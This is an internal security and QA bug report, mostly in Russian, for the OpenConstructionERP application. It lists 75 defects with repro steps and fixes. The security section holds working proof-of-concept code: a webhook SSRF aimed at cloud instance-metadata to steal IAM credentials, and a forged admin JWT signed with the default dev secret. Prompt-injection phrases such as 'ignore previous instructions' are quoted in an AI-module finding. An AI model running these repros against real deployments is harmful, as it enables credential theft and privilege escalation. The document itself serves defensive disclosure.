# OpenConstructionERP — BUGS (Part 4)

**Дата:** 2026-04-18
**Версия:** 1.9.0 · commit `767b38f232596cfb191f9790ce2053ab5108a7d4`
**Предыдущие части:**
- `archive/part1.zip` — 21 баг
- `archive/part2.zip` — 10 багов (2 BLOCKER + 1 SECURITY-CRIT)
- `archive/part3.zip` — 8 багов (2 MAJOR)

## Методология Part 4 — 7 параллельных субагентов

| Агент | Область | Тестов | PASS | FAIL | SKIP |
|-------|---------|--------|------|------|------|
| A | Frontend Playwright deep UI | 28 | 26 | 2 | 0 |
| B | DB schema / SQLAlchemy (47 files, 108 models) | 44 defects | — | — | — |
| C | Deep security (SSRF/XXE/IDOR/JWT) | 17 | 13 | 3 | 1 |
| D | AI module architecture | 24 | 24 | 0 | 0 |
| E | BIM/CAD/Takeoff | 19 | 12 | 0 | 7 xfail |
| F | 42 validation rules × 2 cases | 84 | 79 | 0 | 5 xfail |
| G | CHANGELOG + git history | — | — | — | — |
| **Σ** | | **172** | **154** | **5** | **13** |

## Статистика Part 4

| Severity        | Новых  |
|-----------------|--------|
| SECURITY-CRIT   | 3      |
| BLOCKER         | 1      |
| CRITICAL        | 12     |
| MAJOR           | 22     |
| MINOR           | 28     |
| INFO            | 9      |
| **Всего**       | **75** |

## Общая статистика (части 1–4)

| Severity        | Всего |
|-----------------|-------|
| BLOCKER         | 7     |
| SECURITY-CRIT   | 4     |
| CRITICAL        | 13    |
| MAJOR           | 28    |
| MINOR           | 45    |
| INFO            | 17    |
| **Всего**       | **114** |

---

# 🔥 SECURITY-CRITICAL (3 новых)

## BUG-040 · SECURITY-CRITICAL · module: integrations · category: SSRF
**Заголовок:** Webhook URL принимает link-local / cloud-metadata адреса → credentials exfiltration.

**Source:** `backend/app/modules/integrations/schemas.py` (`WebhookCreate.url: str`, нет валидации), `service.py:160` (`httpx.post(hook.url)`).

**Репро:**
```python
import httpx
tok = httpx.post("http://127.0.0.1:8080/api/v1/users/auth/login/",
    json={"email":"demo@openestimator.io","password":"DemoPass1234!"}).json()["access_token"]
r = httpx.post("http://127.0.0.1:8080/api/v1/integrations/webhooks/",
    headers={"Authorization": f"Bearer {tok}"},
    json={"name":"ssrf","url":"http://169.254.169.254/latest/meta-data/","events":["rfi.created"]})
# → 201 Created; webhook fires against AWS metadata on any event
```

**Impact:** Любой authenticated user (в т.ч. estimator) может зарегистрировать webhook на AWS/GCP/Azure instance-metadata → IAM-credentials exfil. Также: probe внутренних сервисов (Redis 127.0.0.1:6379, MinIO :9000, Qdrant :6333). Response body сохраняется в `WebhookDelivery.response_body[:1000]` → blind SSRF становится semi-blind.

**Fix:**
1. `WebhookCreate.url: HttpUrl` (rejects non-http schemes).
2. На delivery: resolve host, reject loopback/private/link-local IPs.
3. Allowlist per-tenant.
4. `httpx` egress proxy с той же политикой.

---

## BUG-041 · SECURITY-CRITICAL · module: integrations · category: SSRF/LFI
**Заголовок:** Webhook URL принимает `file://`, `dict://`, `gopher://` схемы.

Sibling BUG-040. Сейчас httpx отвергает `file://` на доставке (блокируется на транспортном уровне), но API-контракт неверен — dangerous URL хранится в БД и может быть выполнен через downstream retry logic / corporate httpx forks.

**Fix:** тот же что BUG-040.

---

## BUG-042 · SECURITY-CRITICAL · module: auth · category: JWT-forgery + privilege-escalation
**Заголовок:** JWT forgery через default dev secret + self-asserted role=admin в claims.

**Source:**
- `backend/app/config.py:70` — `jwt_secret: str = "openestimate-local-dev-key"` (26 байт, ниже RFC 7518 32-byte min для HS256)
- `backend/app/dependencies.py:198` — `RequirePermission` **доверяет `role` claim напрямую** (if role == "admin": return bypass)

**Репро (как estimator):**
```python
import httpx, jwt, time
tok_e = httpx.post(".../auth/login/", json={"email":"estimator@...","password":"DemoPass1234!"}).json()["access_token"]
assert httpx.get(".../users/", headers={"Authorization": f"Bearer {tok_e}"}).status_code == 403
sub = jwt.decode(tok_e, options={"verify_signature": False})["sub"]
forged = jwt.encode({
    "sub": sub, "email": "estimator@openestimator.io",
    "role": "admin",  # ← upgrade!
    "permissions": ["admin"], "iat": int(time.time()), "exp": int(time.time())+3600,
    "type": "access",
}, "openestimate-local-dev-key", algorithm="HS256")
assert httpx.get(".../users/", headers={"Authorization": f"Bearer {forged}"}).status_code == 200  # admin access
```

**Impact:**
- Любой, кто знает / угадывает / видит default `JWT_SECRET` (он в `.env.example`, в source-коде), подписывает токен с role=admin = полный admin-bypass.
- `password_changed_at` check обходится свежим `iat`.
- Atribution сломана — admin-действия логируются на `sub` estimator'а.
- Every default deployment = catastrophic exposure.

**Fix:**
1. **Fail startup** если `jwt_secret == "openestimate-local-dev-key"` AND `app_env != "development"`. Property `jwt_secret_is_default` уже есть на `config.py:161` — wire up к `main.create_app()`.
2. Generate random secret при первом boot.
3. Require `JWT_SECRET` ≥ 32 bytes.
4. **Stop trusting self-asserted `role` / `permissions` claims.** Re-hydrate из БД по `sub` на каждом запросе (`User.role`). Пользователь уже загружается в `get_current_user_payload` для `password_changed_at` — cost zero.
5. Рассмотреть EdDSA / RS256.

---

# 🔥 BLOCKER (1 новый)

## BUG-043 · BLOCKER · module: auth · category: availability
**Заголовок:** Login endpoint зависает для demo-admin после нескольких попыток (вместо 429).

**Репро:**
```bash
# После 5-10 неудачных login attempts:
curl -m 15 -X POST http://127.0.0.1:8080/api/v1/users/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@openestimator.io","password":"DemoPass1234!"}'
# → [000 15.007s] (connection timeout, 30s+ ожидания)

# В этот же момент:
curl -X POST ... -d '{"email":"estimator@...","password":"DemoPass1234!"}'
# → 429 Too many login attempts. (4ms)  ← работает
```

**Impact:**
- Блокирует primary seeded admin (demo@).
- Playwright/Cypress/Selenium не могут работать с рекомендуемыми credentials.
- Uvicorn worker держит слот до timeout клиента — DoS vector под rate-limit pressure.
- User видит бесконечно крутящийся "Anmelden" без feedback.

**Fix:** Rate-limit path для conflict-user должен немедленно вернуть 429, никогда не блокировать uvicorn worker. Потенциально: bcrypt worker stuck / deadlock в per-user RL.

---

# 🔥 CRITICAL (12 новых)

## BUG-044 · CRITICAL · module: auth · category: regression
**Заголовок:** `change-password` с `new_password == current_password` ломает аккаунт → HTTP 500 на login.

**Репро (from Agent G):**
```bash
# Change password with new == current
curl -X POST -H "Authorization: Bearer $TOK" \
  /api/v1/users/me/change-password/ \
  -d '{"current_password":"DemoPass1234!","new_password":"DemoPass1234!"}'
# → 200 OK

# Subsequent login with same creds:
curl -X POST /api/v1/users/auth/login/ -d '{"email":"demo@...","password":"DemoPass1234!"}'
# → 500 Internal Server Error (воспроизведено 2×)
```

**Impact:** Demo-аккаунт залочивается до reseed. Любой пользователь, случайно нажавший "change password" и оставивший тот же пароль — locked out.

**Fix:** либо валидация на уровне schema (`new_password != current_password` — требовать разные), либо корректная обработка этого edge case.

---

## BUG-045 · CRITICAL · module: db · category: FK-enforcement
**Заголовок:** SQLite `PRAGMA foreign_keys = ON` не активирован → все declared ondelete rules декоративные.

**Source:** `backend/app/database.py:107-115`:
```python
@sa_event.listens_for(Engine, "connect")
def _set_sqlite_pragma(dbapi_conn, _):
    cursor = dbapi_conn.cursor()
    cursor.execute("PRAGMA journal_mode=WAL")
    cursor.execute("PRAGMA busy_timeout=30000")
    cursor.close()
```
**Missing:** `cursor.execute("PRAGMA foreign_keys = ON")`.

**Impact:** Каждое declared `ForeignKey(..., ondelete="CASCADE" | "SET NULL")` — no-op на SQLite (V4 pip-install инстанс). Все 22+ missing-FK баги BUG-046 становятся real defects как только перейдут на PostgreSQL (где FKs всегда enforced).

**Fix:** добавить `cursor.execute("PRAGMA foreign_keys = ON")` в `_set_sqlite_pragma`.

---

## BUG-046 · CRITICAL · module: db · category: missing-FK (cluster)
**Заголовок:** 22+ столбцов `*_id` declared как bare `GUID()` без ForeignKey → orphan rows на cascade.

**Source (7 файлов, подтверждено `PRAGMA foreign_key_list(...)` zero FKs):**

| Severity | File | Column |
|----------|------|--------|
| 🔴 A-1 | `finance/models.py:28` | `Invoice.project_id` |
| 🔴 A-2 | `finance/models.py:140` | `ProjectBudget.project_id` |
| 🔴 A-3 | `finance/models.py:169` | `EVMSnapshot.project_id` |
| 🔴 A-4 | `full_evm/models.py:20` | `EVMForecast.project_id` |
| 🔴 A-5 | `procurement/models.py:23` | `PurchaseOrder.project_id` |
| 🔴 A-6 | `reporting/models.py:30,113` | `KPISnapshot.project_id`, `GeneratedReport.project_id` |
| 🔴 A-7 | `schedule/models.py:289,328` | `ScheduleBaseline.project_id`, `ProgressUpdate.project_id` |
| 🟠 A-8..A-24 | bim_hub, tendering, rfq_bidding, costmodel, ai, teams, workflows, erp_chat, validation, rfi, inspections, submittals, meetings, collaboration, transmittals, cde, integrations | ~22 колонок |

**Impact:** Orphan rows at scale. Когда `PRAGMA foreign_keys = ON` включится (BUG-045) — всё эти missing FK становятся видимыми. Критично перед переходом на PostgreSQL (где FKs always enforced).

**Fix:** для каждого добавить `ForeignKey("oe_projects_project.id", ondelete="CASCADE")` либо `ondelete="SET NULL"` для audit-подобных.

---

## BUG-047 · CRITICAL · module: frontend · category: auth-ui
**Заголовок:** SPA routes **всегда возвращают landing page** при unauthenticated, URL не меняется на `/login`.

**Репро:**
1. Чистая Chromium сессия без cookies.
2. `http://127.0.0.1:8080/dashboard` → URL остаётся `/dashboard`, рендерится **marketing landing + login panel**.
3. Same для всех 22 routes (`/projects`, `/boq`, `/costs`, ..., `/contacts`).

**Impact:**
- Bookmark `/boq` → видит marketing страницу, confused.
- После login — не возвращается на intended route.
- SEO: все internal routes возвращают 200 identical HTML.
- **Безопасность:** route guard missing — automated tools не могут определить auth state через redirect.

**Fix:** unauthenticated navigation → redirect `/login?next=/dashboard` или render AuthGate component.

---

## BUG-048 · CRITICAL · module: frontend · category: React-crash
**Заголовок:** Unhandled React error #31 на 422 login response (Pydantic `detail` array → JSX child).

**Репро:**
1. `/login`, submit с невалидным email.
2. Backend корректно возвращает `422 {"detail": [{"type":...,"loc":...,"msg":...}]}`.
3. Frontend **crashes** с `Minified React error #31: object with keys {type, loc, msg, input, ctx}`.

**Impact:** Любая validation error на login (или другие формы, bubbling 422 в render) ломает UI — пользователь должен reload. Означает что где-то `{detail: [...]}` передаётся в JSX как child вместо map → read message.

**Fix:** в error handler: `error.detail.map(d => d.msg).join(', ')` вместо render напрямую.

---

## BUG-049 · CRITICAL · module: takeoff · category: sqlite-lock-contention
**Заголовок:** Частые 500s на parallel writes в SQLite (`sqlite3.OperationalError: database is locked`).

**Наблюдалось при uploads в `/bim_hub/upload-cad/`, `/dwg_takeoff/drawings/upload/`, даже `/users/auth/login/`.

**Source:** SQLite + multi-writer без proper retry. `PRAGMA busy_timeout=30000` есть но не всегда помогает при concurrent transactions.

**Impact:** Random 500 ответы пользователю при одновременных операциях. Частично объясняет BUG-043 (login hang).

**Fix:**
1. Retry middleware catches `OperationalError on write` + 2-3 retries с jitter.
2. Или переход на PostgreSQL (production profile).
3. `dwg_takeoff/router.py:177-182` — заменить blanket `except Exception` на конкретные handlers: `IntegrityError→409`, `OperationalError→503`, `HTTPException: raise`, иначе 500.

---

## BUG-050–055 · CRITICAL cluster (DB type-lies + logic)

- **BUG-050** `takeoff/models.py:66` — `TakeoffDocument.project_id: Mapped[uuid.UUID]` non-null type но `nullable=True` в DB.
- **BUG-051** `enterprise_workflows/models.py:29` — `ApprovalWorkflow.steps: Mapped[dict]` но default/server_default = `list`. Type-lie.
- **BUG-052** `boq/models.py:232` — `BOQActivityLog.user_id` использует `ondelete="CASCADE"` → удаление юзера стирает весь audit trail (нарушение SOX/ISO 19650).
- **BUG-053** Agent-C SSRF webhook trigger → 10s DB-lock → cascading login 500s (minor DoS primitive на SQLite).
- **BUG-054** Agent-G bug: Contacts `country_code` по-прежнему capped 2 chars (422 на "USA"); `contact_type` теперь required but undocumented.
- **BUG-055** Agent-G bug: RFI `GET /api/v1/rfi/` (no filter) → `[]`; список требует `?project_id=`; frontend calling unfiltered видит пустоту.

---

# MAJOR (22 новых)

## BUG-056 · MAJOR · AI · hardcoded prompts
`backend/app/modules/ai/prompts.py` — все SYSTEM/TEXT/PHOTO/CAD prompts baked в Python literals. Contradicts `CLAUDE.md` "i18n EVERYWHERE". Нельзя редактировать per-tenant / per-language / A/B test. **Fix:** move to `data/prompts/{locale}/{template}.md` + PromptRegistry.

## BUG-057 · MAJOR · AI · no output schema validation
`service.py:55-125` (`_validate_items`) — regex-heuristic `extract_json` + hand-filter. **No Pydantic schema** для AI response. Negative unit_rate, missing classification, garbage keys — flow through. **Fix:** `TypeAdapter(list[AIBoqItem]).validate_python(parsed)`.

## BUG-058 · MAJOR · AI · no retry/circuit breaker
`ai_client.py:91,157,219,327` — single `httpx.post` + static 120s timeout. Нет `tenacity` retry на 5xx, exponential backoff на 429, connection-vs-read split. Stuck upstream держит worker 120s.

## BUG-059 · MAJOR · AI · no provider failover
`ai_client.py:485` (`resolve_provider_and_key`) — `_FALLBACK_ORDER` используется только когда у primary нет ключа. На runtime 429/5xx — просто fail.

## BUG-060 · MAJOR · AI · no prompt-injection defense
`service.py:357` — `request.description` идёт verbatim в `.format()` prompt. Markdown code-fence break / fake `</system>` / "ignore previous instructions" доставляются модели. **Fix:** `<untrusted_user_input>{escape_xml(description)}</untrusted_user_input>` + system-prompt rule.

## BUG-061 · MAJOR · AI · Cost Advisor citation bypass
`router.py:703-706, 830-850` — `if code in answer` легко bypass если модель paraphrasing drops the code. Sources list wipes → confident answer with **zero citations**. **Fix:** tool-style prompt → `{answer, citations: [...]}` JSON; reject if `citations == []`.

## BUG-062 · MAJOR · AI · 13 providers not 7 (doc mismatch)
README claims 7 LLM providers, actual `_OPENAI_COMPAT_CONFIG` + hand-written = 13. Also 4 columns (zhipu/baidu/yandex/gigachat) в models.py не listed в `_OPENAI_COMPAT_CONFIG` → dead columns.

## BUG-063 · MAJOR · frontend · form autofill
Login submit button = no-op когда React state не primed через `dispatchEvent`. Browser autofill / password managers молча fail.

## BUG-064 · MAJOR · frontend · i18n RTL missing
Arabic locale (`localStorage.i18nextLng = 'ar'`) — `document.documentElement.dir` остаётся `"ltr"`. WCAG 1.3.2 violation, blocker для MENA-рынка (Dubai — один из 5 demo projects).

## BUG-065–077 · MAJOR cluster (validation rule, missing-FK, AI)

- **BUG-065** Agent-F: `boq_quality.currency_consistency` — one-line fix в `validation/service.py:258` (не проецирует currency в per-position dict).
- **BUG-066–068** Agent-B: 18 HIGH-severity missing-FK в bim_hub, tendering, rfq_bidding, costmodel.
- **BUG-069** Agent-C login timing — OK (<250ms diff) — **false positive, positive finding**.
- **BUG-070** Agent-E: `dwg_takeoff/router.py:177-182` blanket `except Exception` прячет root cause.
- **BUG-071** Agent-E: `requirements.txt:85` pins `ifcopenshell==0.8.4.post1` — policy yellow flag (не imported в коде, OK).
- **BUG-072** Agent-D M-7: API-key encryption derived from `JWT_SECRET` → rotation silently invalidates all stored keys.
- **BUG-073** Agent-D M-10: Router exposes raw upstream error strings (до 200 chars).
- **BUG-074** Agent-A INFO-1: `oe_error_log` в localStorage grows unbounded, может содержать PII.
- **BUG-075** Agent-G: 10+ версий в CHANGELOG без git tag (v1.1, 1.2, 1.3.x, 1.4.x, 1.5.3, 1.6.1, 1.7.x).
- **BUG-076** Agent-G: AGENT_START.md заявляет v0.8.0 / Phase 0, реальный код v1.9.0 — docs rot.
- **BUG-077** Agent-G: TASK_PROGRESS.md Wave 1 — все 6 items 🔲 TODO, хотя changelog заявляет fixes.

---

# MINOR (28 новых) — сгруппированно

## Frontend (Agent A)
- **BUG-078** Language switcher не discoverable — нет `data-testid="language-switcher"`.
- **BUG-079** 3 non-form buttons declared `type="submit"` (Deutsch, Anmelden, Mehr erfahren) — Enter key ambiguity + a11y warnings.
- **BUG-080** `/projects` не exposes clickable project cards (artifact of BUG-047 auth issue, but user-facing).

## AI (Agent D, M-8..L-16)
- **BUG-081** No server-side token budget / per-user quota.
- **BUG-082** No idempotency на `/estimate/*` (каждый POST = новый job → billed AI call).
- **BUG-083** Raw upstream error strings leak в API response.
- **BUG-084** Quick-estimate swallows useful error context ("invalid input" вместо "AI key invalid").
- **BUG-085** 17 `*_api_key` columns в oe_ai_settings — migration per provider. Dead columns (zhipu/baidu/yandex/gigachat).
- **BUG-086** `AI_TIMEOUT = 120.0` module-level constant — не configurable.
- **BUG-087** Models pinned to specific versions (claude-sonnet-4-20250514, gpt-4o, gemini-2.0-flash) — silent deprecation risk.
- **BUG-088** `AIEstimateJob.result` — `sqlalchemy.JSON` (не `JSONB`) → no indexed queries в Postgres.
- **BUG-089** `_build_job_response` inconsistent: писатели хранят `list`, читатели ждут `list | {"items": list}`.

## DB (Agent B)
- **BUG-090** Indexes: AI status / correspondence direction / fieldreports date — composite индексы нужны.
- **BUG-091** 8 таблиц без `created_by` (catalog, costs, i18n_foundation, ai, projects.wbs/milestone, finance.Payment/ProjectBudget/EVMSnapshot, boq.BOQMarkup).
- **BUG-092** JSONB columns all typed `Any` в Pydantic — no validation (classification / cad_element_ids / bim_element_ids / validation_rule_sets / name_translations / integrations.config).
- **BUG-093** Dates stored as `String(20)` вместо `Date`/`DateTime` — no index-based range queries on Postgres.

## Security (Agent C info)
- **BUG-094** Stock `xml.etree.ElementTree` используется в MSP-XML import — не exploitable в stdlib, но рекомендуется `defusedxml`.

## Validation (Agent F)
- **BUG-095** `boq_quality.no_duplicate_ordinals` — latent (API 409 raises before rule runs). Remove or run on bulk import paths.
- **BUG-096** `boq_quality.negative_values` — latent (`PositionCreate.ge=0.0`).
- **BUG-097** `boq_quality.total_mismatch` — latent (server computes total).
- **BUG-098** `boq_quality.empty_unit` — latent (`PositionCreate.unit.min_length=1`).

## BIM/CAD (Agent E)
- **BUG-099** Zero-byte `.dxf` upload → 201 + created row + background parse fail (pollution).
- **BUG-100** Corrupt `.dxf` (plain text) → sometimes 500 on SQLite contention.
- **BUG-101** `bim_hub/upload-cad/` не делает magic-byte check для RVT/DWG/DGN — PDF renamed `.rvt` → 201.
- **BUG-102** ZIP-bomb-as-`.dxf` — сервер сам не unzip'ает, но 500 под contention.
- **BUG-103** Missing filename error — Pydantic quirk "received: `<class 'str'>`" не user-friendly.

## Process / Docs (Agent G)
- **BUG-104** RECOMMENDATIONS.md #3 (Schedule CPM crash) — not verified, remains listed.
- **BUG-105** RECOMMENDATIONS.md #6 (BOQ bulk delete) — design-open, no `/batch/delete` endpoint.

---

# INFO (9 новых)

- **BUG-106..114** — positive probes / notes (server headers leak commit hash; WebSocket auth works; pagination validation works; response-splitting protected; etc.).

---

# Позитивные находки Part 4 — резюме

**Agent A (UI):** 26/28 routes returned 200 without `pageerror` / non-noise `console.error`. But all showed landing page due to auth issue.

**Agent B (DB):**
- No Decimal-as-Float money bug (100% Strings with Pydantic Decimal conversion).
- 100% `oe_*` naming convention compliance.
- Models and DB in sync (109 tables = 108 in models + 1 core).

**Agent C (Security):** Verified clean on XXE, deserialization, open-redirect, cross-user IDOR, timing, HTTP verb tampering, response splitting, WebSocket auth, race conditions, pagination abuse.

**Agent D (AI):**
- API keys encrypted at rest (Fernet).
- Masked responses (`*_set` booleans only).
- Full job audit trail (tokens, duration, model, result, error).
- Per-user rate limit with `X-RateLimit-Remaining` header.
- Ownership checks enforced.
- Pydantic input validation (min_length=10 на description).

**Agent E (BIM):**
- No `import ifcopenshell` в app-коде (policy compliance).
- `BackgroundTasks` off-request-path (IFC processing не держит connection).
- Optional deps guarded (ezdxf/trimesh/pymupdf probe + degrade).
- Path-traversal guard в `takeoff/router.py::_resolve_target_path`.
- DDC converter install — refuses sudo, surfaces command to user.
- No process crash / OOM на любом upload scenario (19 тестов).

**Agent F (Validation):**
- **Все 42 validation rules работают корректно** на positive + negative cases (кроме 5 latent, которые unreachable through API guards).
- No 500s, no false positives / negatives. Engine < 250ms per rule set.

**Agent G (History):**
- RECOMMENDATIONS.md #1 (PDF crash), #2 (change-password 500), #5 (tour persistence) — FIXED в v1.9.0.
- Frontend: **0 real TODO/FIXME** — очень чисто.
- Backend: только 5 genuine TODOs (contacts x2, costmodel, risk, users, plugin_manager).

---

# Рекомендованный порядок исправлений

1. **Сразу (security):** BUG-042 (JWT forgery) → fail startup на default secret. BUG-040/041 (SSRF) → HttpUrl + IP filter.
2. **Срочно (availability):** BUG-043 (login hang), BUG-044 (change-password regression), BUG-049 (SQLite contention).
3. **Перед prod:** BUG-045 (FK pragma), BUG-046 (22 missing FKs), BUG-047 (SPA auth redirect), BUG-048 (React error #31).
4. **UX:** BUG-064 (RTL), BUG-063 (autofill), BUG-056-062 (AI architecture).
5. **DB polish:** BUG-050-052, BUG-090-093.
